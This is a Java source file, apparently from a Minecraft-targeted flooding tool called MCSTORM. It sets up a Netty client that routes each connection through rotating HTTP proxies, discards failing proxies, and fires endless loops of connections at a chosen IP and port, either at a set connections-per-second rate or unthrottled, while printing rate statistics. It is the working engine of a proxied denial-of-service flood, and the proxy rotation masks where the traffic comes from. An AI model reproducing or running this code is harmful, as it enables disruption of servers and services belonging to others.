package io.MCSTORM.utils;

import io.MCSTORM.Main;
import io.MCSTORM.methods.Method;
import io.netty.bootstrap.Bootstrap;
import io.netty.channel.*;
import io.netty.channel.epoll.EpollEventLoopGroup;
import io.netty.channel.epoll.EpollSocketChannel;
import io.netty.channel.nio.NioEventLoopGroup;
import io.netty.channel.socket.SocketChannel;
import io.netty.channel.socket.nio.NioSocketChannel;
import io.netty.handler.codec.http.*;
import io.netty.handler.proxy.HttpProxyHandler;
import io.netty.util.ResourceLeakDetector;

import java.net.InetAddress;
import java.util.concurrent.ThreadFactory;

public class NettyBootstrap {
    public static final EventLoopGroup loopGroup;
    public static final Class<? extends Channel> socketChannel;
    public static final Method method;
    public static final ProxyLoader proxyLoader;
    public static final ChannelHandler channelHandler;
    public static final Bootstrap bootstrap;
    public static final boolean disableFailedProxies;
    public static int integer = 0;
    public static int nettyThreads;
    public static int triedCPS = 0;
    public static int totalConnections = 0;
    public static int totalSeconds = 0;

    static {
        nettyThreads = Main.nettyThreads;
        disableFailedProxies = true;
        if (System.getProperty("os.name").toLowerCase().contains("win")) {
            socketChannel = NioSocketChannel.class;
            loopGroup = new NioEventLoopGroup(nettyThreads, new ThreadFactory() {
                public Thread newThread(Runnable r) {
                    Thread t = new Thread(r);
                    t.setDaemon(true);
                    t.setPriority(10);
                    return t;
                }
            });
        } else {
            socketChannel = EpollSocketChannel.class;
            loopGroup = new EpollEventLoopGroup(nettyThreads, r -> {
                Thread t = new Thread(r);
                t.setDaemon(true);
                t.setPriority(10);
                return t;
            });
        }
        method = Main.method;
        proxyLoader = Main.proxies;
        channelHandler = new ChannelHandler() {
            public void handlerRemoved(ChannelHandlerContext arg0) throws Exception {
            }

            public void handlerAdded(ChannelHandlerContext arg0) throws Exception {
            }

            public void exceptionCaught(ChannelHandlerContext c, Throwable t) throws Exception {
                c.close();
            }
        };
        ChannelInitializer<SocketChannel> channelInitializer = new ChannelInitializer<>() {
            public void channelInactive(ChannelHandlerContext ctx) throws Exception {
                ctx.channel().close();
            }

            protected void initChannel(final SocketChannel c) {
                try {
                    final ProxyLoader.Proxy proxy = NettyBootstrap.proxyLoader.getProxy();
                    final HttpProxyHandler proxyHandler = new HttpProxyHandler(proxy.addrs);
                    proxyHandler.setConnectTimeoutMillis(5000L);

                    if (Main.http) {
                        c.config().setKeepAlive(true);
                        c.config().setTcpNoDelay(true);
                    }

                    proxyHandler.connectFuture().addListener(f -> {
                        if (f.isSuccess() && proxyHandler.isConnected()) {
                            NettyBootstrap.method.accept(c, proxy);
                            proxyLoader.saveWorkProxy(proxy);
                        } else {
                            if (NettyBootstrap.disableFailedProxies) {
                                NettyBootstrap.proxyLoader.disabledProxies.put(proxy, Long.valueOf(System.currentTimeMillis()));
                            }
                            c.close();
                        }
                    });
                    c.pipeline().addFirst(proxyHandler).addLast(NettyBootstrap.channelHandler);
                    if (Main.http) {
                        c.pipeline()
                                .addLast(new HttpClientCodec())
                                .addLast(new HttpObjectAggregator(1024 * 10 * 1024))
                                .addLast(new HttpContentDecompressor())
                                .addLast(new HttpHandler());
                    }
                } catch (Exception e) {
                    c.close();
                }
            }

            public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) throws Exception {
                ctx.close();
            }
        };
        bootstrap = Main.http ? new Bootstrap().channel(socketChannel).group(loopGroup)
                .option(ChannelOption.CONNECT_TIMEOUT_MILLIS,5000)
                .option(ChannelOption.SO_KEEPALIVE, true)
                .option(ChannelOption.TCP_NODELAY,true)
                .handler(channelInitializer) : new Bootstrap().channel(socketChannel).group(loopGroup).option(ChannelOption.TCP_NODELAY, true).option(ChannelOption.AUTO_READ, false).handler(channelInitializer);
    }

    public static void start() {
        ResourceLeakDetector.setLevel(ResourceLeakDetector.Level.SIMPLE);
        InetAddress ip = Main.resolved;
        int port = Main.port;
        (new Thread(() -> {
            if (Main.duration < 1) {
                Main.duration = 600;
            }
            for (int i = 0; i < Main.duration; i++) {
                try {
                    Thread.sleep(1000L);
                } catch (InterruptedException ignored) {
                }
                totalSeconds++;
                System.out.println("Current CPS: " + integer + " | Target CPS: " + triedCPS + " | Average CPS: " + Math.ceil(totalConnections / totalSeconds));
                integer = 0;
                triedCPS = 0;
            }
            System.out.println("Exit...");
            System.exit(0);
        })).start();
        if (Main.targetCPS == -1) {
            for (int k = 0; k < Main.loopThreads; k++) {
                (new Thread(() -> {
                    while (true) {
                        triedCPS++;
                        if (Main.http) {
                            bootstrap.connect(Main.origIP, port);
                        } else bootstrap.connect(ip, port);
                    }
                })).start();
            }
        } else {
            for (int k = 0; k < Main.loopThreads; k++) {
                (new Thread(() -> {
                    while (true) {
                        for (int j = 0; j < Main.targetCPS / Main.loopThreads / 10; j++) {
                            triedCPS++;
                            if (Main.http) {
                                bootstrap.connect(Main.origIP, port);
                            } else bootstrap.connect(ip, port);
                        }
                        try {
                            Thread.sleep(100L);
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }
                    }
                })).start();
            }
        }
    }
}